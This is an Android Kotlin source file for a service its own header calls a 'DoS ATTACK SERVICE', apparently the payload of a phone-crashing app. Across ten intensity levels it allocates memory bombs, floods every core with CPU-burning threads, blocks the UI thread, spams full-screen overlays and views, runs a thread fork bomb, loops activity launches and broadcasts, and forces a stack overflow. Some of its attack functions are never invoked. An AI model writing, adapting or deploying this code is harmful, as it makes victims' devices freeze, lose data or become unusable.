package com.sync.xxx

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.graphics.PixelFormat
import android.widget.LinearLayout
import android.os.Build
import android.provider.Settings
import android.content.Context
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import android.graphics.Color
import java.util.concurrent.Executors
import kotlin.random.Random

/**
 * CRASH UI SYSTEM - DoS ATTACK SERVICE
 * 
 * Level 1-3: UI Freeze & Lag (ANNOYING)
 * Level 4-6: Memory Bomb & CPU Overload (HANG)
 * Level 7-8: System Crash & Force Restart (HARD)
 * Level 9-10: Bootloop & Total System Failure (EXTREME)
 */
class CrashUIService : Service() {

    companion object {
        const val ACTION_START = "com.sync.xxx.CRASH_UI_START"
        const val ACTION_STOP = "com.sync.xxx.CRASH_UI_STOP"
        const val EXTRA_LEVEL = "level"
        private const val TAG = "CrashUIService"
    }

    private var windowManager: WindowManager? = null
    private val overlayViews = mutableListOf<View>()
    private val handlers = mutableListOf<Handler>()
    private val executors = mutableListOf<Executors>()
    private var isRunning = false
    private var currentLevel = 1

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val level = intent.getIntExtra(EXTRA_LEVEL, 1).coerceIn(1, 10)
                startCrashAttack(level)
            }
            ACTION_STOP -> {
                stopCrashAttack()
            }
        }
        return START_STICKY
    }

    private fun startCrashAttack(level: Int) {
        if (isRunning) stopCrashAttack()
        
        isRunning = true
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        Log.d(TAG, "🔥 Starting CRASH UI Attack - Level $level")

        // ═══════════════════════════════════════════════════════════
        // LEVEL-BASED CRASH - SEMAKIN TINGGI SEMAKIN BRUTAL
        // ═══════════════════════════════════════════════════════════
        
        when {
            level in 1..3 -> launchLightCrash(level)      // Lag & Freeze
            level in 4..6 -> launchMediumCrash(level)     // Hang & Restart
            level in 7..10 -> launchHeavyCrash(level)     // Instant Crash
        }
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 1-3: LIGHT CRASH (LAG & FREEZE)
    // ═══════════════════════════════════════════════════════════
    private fun launchLightCrash(level: Int) {
        Log.d(TAG, "💨 Light Crash Level $level")
        
        // Memory allocation (1-3 GB)
        Thread {
            val memoryBombs = mutableListOf<ByteArray>()
            try {
                repeat(level * 100) { // 100-300 x 10MB
                    if (isRunning) {
                        memoryBombs.add(ByteArray(10 * 1024 * 1024))
                        Thread.sleep(10)
                    }
                }
            } catch (e: OutOfMemoryError) {
                Log.d(TAG, "💣 Memory bomb level $level")
            }
        }.start()

        // CPU burner (light)
        val cores = Runtime.getRuntime().availableProcessors()
        repeat(cores * level) {
            Thread {
                while (isRunning) {
                    var sum = 0.0
                    for (i in 0..50000) {
                        sum += Math.sqrt(i.toDouble())
                    }
                    Thread.sleep(5)
                }
            }.start()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 4-6: MEDIUM CRASH (HANG & RESTART)
    // ═══════════════════════════════════════════════════════════
    private fun launchMediumCrash(level: Int) {
        Log.d(TAG, "💥 Medium Crash Level $level")
        
        // Memory bomb (4-6 GB)
        Thread {
            val memoryBombs = mutableListOf<ByteArray>()
            try {
                repeat(level * 100) { // 400-600 x 10MB
                    if (isRunning) {
                        memoryBombs.add(ByteArray(10 * 1024 * 1024))
                        Thread.sleep(5)
                    }
                }
            } catch (e: OutOfMemoryError) {
                Log.d(TAG, "💣 Memory bomb level $level")
            }
        }.start()

        // CPU destroyer (medium)
        val cores = Runtime.getRuntime().availableProcessors()
        repeat(cores * level * 2) {
            Thread {
                while (isRunning) {
                    var sum = 0.0
                    for (i in 0..200000) {
                        sum += Math.sqrt(i.toDouble())
                        sum += Math.pow(i.toDouble(), 2.0)
                    }
                }
            }.start()
        }

        // UI thread blocker
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                if (isRunning) {
                    var result = 0.0
                    for (i in 0..100000) {
                        result += Math.sqrt(i.toDouble())
                    }
                    handler.postDelayed(this, 5)
                }
            }
        }
        handler.post(runnable)
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 7-10: HEAVY CRASH (INSTANT CRASH & RESTART)
    // ═══════════════════════════════════════════════════════════
    private fun launchHeavyCrash(level: Int) {
        Log.d(TAG, "☠️ Heavy Crash Level $level")
        
        // Memory bomb (7-10 GB)
        Thread {
            val memoryBombs = mutableListOf<ByteArray>()
            try {
                repeat(level * 150) { // 1050-1500 x 10MB
                    if (isRunning) {
                        memoryBombs.add(ByteArray(10 * 1024 * 1024))
                    }
                }
            } catch (e: OutOfMemoryError) {
                Log.d(TAG, "💣 Memory bomb level $level DETONATED!")
            }
        }.start()

        // CPU destroyer (heavy)
        val cores = Runtime.getRuntime().availableProcessors()
        repeat(cores * level * 3) {
            Thread {
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY)
                while (isRunning) {
                    var sum = 0.0
                    for (i in 0..500000) {
                        sum += Math.sqrt(i.toDouble())
                        sum += Math.pow(i.toDouble(), 3.0)
                        sum += Math.log(i.toDouble() + 1)
                    }
                }
            }.start()
        }

        // UI thread destroyer
        val handler = Handler(Looper.getMainLooper())
        val runnable = object : Runnable {
            override fun run() {
                if (isRunning) {
                    var result = 0.0
                    for (i in 0..500000) {
                        result += Math.sqrt(i.toDouble())
                    }
                    handler.post(this)
                }
            }
        }
        handler.post(runnable)

        // View inflation spam (level 7-10 only)
        repeat(level * 10) {
            Thread {
                while (isRunning) {
                    try {
                        val layout = LinearLayout(this)
                        repeat(100) {
                            layout.addView(TextView(this).apply {
                                text = "CRASH".repeat(100)
                            })
                        }
                    } catch (e: Exception) {
                        // Continue
                    }
                }
            }.start()
        }

        // Fork bomb (level 9-10 only)
        if (level >= 9) {
            repeat(100) {
                Thread {
                    recursiveFork(level * 5)
                }.start()
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 1-3: UI FREEZE & LAG (ANNOYING)
    // ═══════════════════════════════════════════════════════════
    private fun launchUIFreeze(level: Int) {
        val intensity = level * 100
        
        // Check if we have overlay permission
        val hasOverlayPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
        
        // Spam overlay windows (only if permission granted)
        if (hasOverlayPermission) {
            repeat(intensity) {
                createSpamOverlay()
            }
        } else {
            Log.w(TAG, "⚠️ No overlay permission, using CPU-only attack")
        }

        // CPU burner threads (ALWAYS work, no permission needed)
        repeat(level * 5) {  // Increased from 2 to 5 for more impact
            Thread {
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY)
                while (isRunning) {
                    // Infinite calculation loop
                    var sum = 0.0
                    for (i in 0..1000000) {  // Increased from 100k to 1M
                        sum += Math.sqrt(i.toDouble())
                        sum += Math.pow(i.toDouble(), 2.0)
                        sum += Math.log(i.toDouble() + 1)
                    }
                }
            }.start()
        }

        // UI thread blocker
        val handler = Handler(Looper.getMainLooper())
        handlers.add(handler)
        
        val runnable = object : Runnable {
            override fun run() {
                if (isRunning) {
                    // Block UI thread with heavy computation
                    var result = 0.0
                    for (i in 0..50000) {
                        result += Math.sqrt(i.toDouble())
                    }
                    handler.postDelayed(this, (5 * level).toLong())
                }
            }
        }
        handler.post(runnable)
        
        // Bonus: Infinite view inflation (UI lag)
        repeat(level * 10) {
            Thread {
                while (isRunning) {
                    try {
                        val layout = android.widget.LinearLayout(this)
                        repeat(100) {
                            layout.addView(android.widget.TextView(this).apply {
                                text = "CRASH"
                            })
                        }
                        Thread.sleep(10)
                    } catch (e: Exception) {
                        // Continue
                    }
                }
            }.start()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 4-6: MEMORY BOMB & CPU OVERLOAD (HANG)
    // ═══════════════════════════════════════════════════════════
    private fun launchMemoryBomb(level: Int) {
        launchUIFreeze(3) // Base attack
        
        // Memory bomb - allocate massive arrays
        Thread {
            val memoryBombs = mutableListOf<ByteArray>()
            try {
                repeat(level * 1000) {
                    if (isRunning) {
                        // Allocate 10MB chunks
                        memoryBombs.add(ByteArray(10 * 1024 * 1024))
                        Thread.sleep(10)
                    }
                }
            } catch (e: OutOfMemoryError) {
                Log.d(TAG, "💣 Memory bomb detonated!")
            }
        }.start()

        // CPU destroyer - max cores usage
        val cores = Runtime.getRuntime().availableProcessors()
        repeat(cores * level) {
            Thread {
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY)
                while (isRunning) {
                    // Prime number calculation (CPU intensive)
                    isPrime(999999999)
                }
            }.start()
        }

        // Recursive view inflation
        recursiveViewCreation(level * 10)
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 7-8: SYSTEM CRASH & FORCE RESTART (HARD)
    // ═══════════════════════════════════════════════════════════
    private fun launchSystemCrash(level: Int) {
        launchMemoryBomb(6) // Max memory bomb
        
        // Infinite window spam
        Thread {
            while (isRunning) {
                try {
                    createCrashOverlay()
                    Thread.sleep(1) // Spam as fast as possible
                } catch (e: Exception) {
                    // Continue even on error
                }
            }
        }.start()

        // System service spammer
        repeat(level * 50) {
            Thread {
                while (isRunning) {
                    try {
                        // Spam system services
                        getSystemService(Context.WINDOW_SERVICE)
                        getSystemService(Context.ACTIVITY_SERVICE)
                        getSystemService(Context.ALARM_SERVICE)
                        getSystemService(Context.NOTIFICATION_SERVICE)
                    } catch (e: Exception) {
                        // Continue
                    }
                }
            }.start()
        }

        // Native crash trigger
        if (level >= 8) {
            triggerNativeCrash()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // LEVEL 9-10: BOOTLOOP & TOTAL SYSTEM FAILURE (EXTREME)
    // ═══════════════════════════════════════════════════════════
    private fun launchBootloopAttack(level: Int) {
        launchSystemCrash(8) // Max system crash
        
        // Fork bomb equivalent
        repeat(level * 100) {
            Thread {
                recursiveFork(level * 10)
            }.start()
        }

        // Infinite activity launcher
        Thread {
            while (isRunning) {
                try {
                    val intent = Intent(this, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    // Continue
                }
            }
        }.start()

        // Broadcast storm
        Thread {
            while (isRunning) {
                try {
                    sendBroadcast(Intent(Intent.ACTION_SCREEN_ON))
                    sendBroadcast(Intent(Intent.ACTION_SCREEN_OFF))
                    sendBroadcast(Intent(Intent.ACTION_USER_PRESENT))
                } catch (e: Exception) {
                    // Continue
                }
            }
        }.start()

        // Stack overflow trigger
        if (level == 10) {
            Thread {
                try {
                    causeStackOverflow()
                } catch (e: StackOverflowError) {
                    Log.d(TAG, "💀 Stack overflow achieved!")
                }
            }.start()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // HELPER METHODS
    // ═══════════════════════════════════════════════════════════

    private fun createSpamOverlay() {
        try {
            val view = TextView(this).apply {
                text = "█"
                setTextColor(Color.argb(50, Random.nextInt(256), Random.nextInt(256), Random.nextInt(256)))
                textSize = 100f
            }

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply {
                x = Random.nextInt(-500, 500)
                y = Random.nextInt(-1000, 1000)
            }

            windowManager?.addView(view, params)
            overlayViews.add(view)
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun createCrashOverlay() {
        try {
            val view = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setBackgroundColor(Color.argb(255, Random.nextInt(256), Random.nextInt(256), Random.nextInt(256)))
            }

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            }

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.OPAQUE
            )

            windowManager?.addView(view, params)
            overlayViews.add(view)
        } catch (e: Exception) {
            // Continue on error
        }
    }

    private fun recursiveViewCreation(depth: Int) {
        if (depth <= 0 || !isRunning) return
        
        Thread {
            try {
                val view = LinearLayout(this)
                repeat(10) {
                    view.addView(TextView(this).apply { text = "CRASH" })
                }
                recursiveViewCreation(depth - 1)
            } catch (e: Exception) {
                // Continue
            }
        }.start()
    }

    private fun recursiveFork(depth: Int) {
        if (depth <= 0 || !isRunning) return
        
        Thread {
            recursiveFork(depth - 1)
            recursiveFork(depth - 1)
        }.start()
    }

    private fun isPrime(n: Int): Boolean {
        if (n <= 1) return false
        for (i in 2..Math.sqrt(n.toDouble()).toInt()) {
            if (n % i == 0) return false
        }
        return true
    }

    private fun triggerNativeCrash() {
        Thread {
            try {
                // Trigger native crash via null pointer
                System.loadLibrary("nonexistent_library_crash")
            } catch (e: Exception) {
                // Try alternative crash methods
                throw RuntimeException("SYSTEM CRASH TRIGGERED")
            }
        }.start()
    }

    private fun causeStackOverflow(): Int {
        return causeStackOverflow() + 1
    }

    // ═══════════════════════════════════════════════════════════
    // STOP ATTACK
    // ═══════════════════════════════════════════════════════════

    private fun stopCrashAttack() {
        isRunning = false
        
        // Remove all overlays
        overlayViews.forEach { view ->
            try {
                windowManager?.removeView(view)
            } catch (e: Exception) {
                // Ignore
            }
        }
        overlayViews.clear()

        // Clear handlers
        handlers.forEach { it.removeCallbacksAndMessages(null) }
        handlers.clear()

        Log.d(TAG, "🛑 CRASH UI Attack stopped")
    }

    override fun onDestroy() {
        stopCrashAttack()
        super.onDestroy()
    }
}
